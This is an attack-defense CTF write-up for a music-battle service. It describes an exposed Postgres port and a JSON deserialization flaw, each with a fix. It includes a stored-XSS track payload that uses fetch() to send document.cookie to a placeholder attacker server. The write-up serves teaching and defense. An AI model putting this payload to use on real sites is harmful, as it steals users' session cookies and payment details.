## Service description

The service is simple tracks editor where you can create music, post it, and start battle with other users by pressing _battle it_ button on their posts.

## Vuln 1

The first vuln is pretty simple. It is published port of the postgresql that is used by back-end:

```yaml

postgres:
    image: postgres:13.2-alpine
    restart: always
    env_file:
      - variables.env
    ports:
      - "5432:5432"
    volumes:
      - trackbattle-postgres-data:/var/lib/postgresql/data
    networks:
      - app-network
```

This vuln gives you opportunity to stole any data from back-and, including flags ;)

You can fix it by removing string`"5432:5432"`.

## Vuln 2

The second vuln is 'mistake' in tracks deserialization. Serialization\deserialization of fields *notes* and *waveform* is legal, but decorating 
function *play* with _@JsonProperty_ is logical mistake - it allows anyone to override playing melodies.

```ts
@JsonObject("Notes")
export class Notes {
    @JsonProperty("notes", String, false)
    notes: string = "";

    @JsonProperty("waveform", String, false)
    waveform: Waveform = "triangle";

    @JsonProperty("play", FunctionConverter, true)
    play = async (player: AudioPlayer) => {
        player.stopPlaying();
        await player.playString(this.notes, this.waveform)
    }
}
```

Overriding *play* function allows execute any code at `/#/track` page when button 'play' is pressed. Note: user appears in `/#/track` page 
with authorization cookies, that is key to the flag (_payment_info_ field at user info which can be obtained by `GET /api/users`).

Simpliest usage of that vuln is creating track such as:
```json
{
   "notes": "AAAAAAAAAAA",
   "waveform": "triangle",
   "play": "fetch('http://your-command-ip:8080/hello' + document.cookie)"
}
```
This track allows you to steal cookies by printing nginx\other http server access logs.

You can fix it by removing decorator _@JsonProperty_.

